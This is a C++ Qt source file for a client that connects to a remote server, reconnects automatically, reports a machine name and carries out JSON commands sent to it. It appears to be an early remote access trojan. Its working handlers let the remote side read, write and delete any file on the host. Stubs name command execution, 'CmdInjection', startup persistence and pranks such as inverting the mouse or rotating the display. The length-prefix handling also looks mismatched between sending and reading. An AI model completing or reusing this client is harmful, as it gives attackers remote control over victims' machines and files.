#include "qclient.h"

QClient::QClient(QString h, qint16 p, QObject *parent) : 
	host(h), port(p) , QObject(parent)
{
    sock = new QTcpSocket(this);
	connect(sock, SIGNAL(connected()), this, SLOT(connected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(tryToConnect()));
	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));

	tryToConnect();

	compName = "Doru";
}

void QClient::tryToConnect()
{
	sock->connectToHost(host, port);
}

void QClient::connected()
{
	sock->write(compName.toUtf8());
	sock->waitForBytesWritten(50);
}

void QClient::disconnected()
{
	qDebug() << "DISCONNECTED";
}

void QClient::readyRead()
{
	if (sock->bytesAvailable())
	{
		//read size of package then the JSON object
		int size = sock->read(sizeof(int)).toInt();
		QByteArray data = sock->read(size);
		QJsonDocument doc = QJsonDocument::fromJson(data);
		QJsonObject resp;
		qDebug() << data;
		if (doc.isObject())
		{
			QJsonObject obj = doc.object();
			if (obj.contains("Id") && obj.contains("Parameters"))
			{
				int id = obj.value("Id").toInt();
				QString response;
				switch ((Commands)id)
				{
				case Commands::CmdInjection:
				{
					response = "CmdInjection";
					break;
				}
				case Commands::ExecProcess:
				{
					response = "ExecProcess";
					break;
				}
				case Commands::CreateFile:
				{
					QJsonArray params = obj.value("Parameters").toArray();
					response = writeFile(params[0].toString(), params[1].toString()) ? "SUCCESS" : "FAILED";
					break;
				}
				case Commands::ReadFile:
				{
					QString fileName = obj.value("Parameters").toString();
					response = readFile(fileName);
					break;
				}
				case Commands::DeleteFile:
				{
					QString fileName = obj.value("Parameters").toString();
					response = deleteFile(fileName) ? "SUCCESS" : "FAILED";
					break;
				}
				case Commands::MouseInvert:
				{
					response = "MouseInvert";
					break;
				}
				case Commands::DisplayRotate:
				{
					response = "DisplayRotate";
					break;
				}
				case Commands::OsMessage:
				{
					response = "OsMessage";
					break;
				}
				default:
				{
					response = "UNKNOWN COMMAND";
				}
				}
				QJsonValue val = response;
				resp.insert("response", val);
			}
			else
			{
				QJsonValue val = "Invalid Format. 'Id' key and 'Parameters' key";
				resp.insert("response", val);
			}
		}
		else
		{
			QJsonValue val = "Invalid Format. Explected JSON";
			resp.insert("response", val);
		}
		QByteArray dataToSend = (QJsonDocument(resp)).toJson();
		qDebug() << dataToSend;
		sendData(dataToSend);
		//sock->flush();
	}
}


void QClient::addStartup()
{

}

QString QClient::startProcess(const QString &proc)
{
	return QString();
}

QString QClient::runCmdCommand(const QString &cmd)
{
	return QString();
}

QString QClient::readFile(const QString &fileName)
{
	QFile f(fileName);
	if (!f.open(QFile::ReadOnly | QFile::Text))
	{
		return QString("CANNOT OPEN FILE ") + fileName;
	}
	QTextStream in(&f);
	QString content = in.readAll();
	f.close();
	return content;
}

bool QClient::writeFile(const QString &fileName, const QString &text)
{
	QFile f(fileName);
	if (!f.open(QFile::WriteOnly | QFile::Text))
	{
		return false;
	}
	QTextStream stream(&f);
	stream << text;
	f.close();
	return true;
}

bool QClient::deleteFile(const QString &fileName)
{
	QFile file(fileName);
	file.remove();
	return !file.exists();
}

void QClient::toggleInvertMouse()
{

}

void QClient::rotateDisplay()
{

}

void QClient::message(const QString &)
{

}

void QClient::sendData(const QByteArray &data)
{
	sock->write(QByteArray::number(data.size()));
	sock->write(data);
	sock->waitForBytesWritten();
}

QClient::~QClient()
{
    delete sock;
}
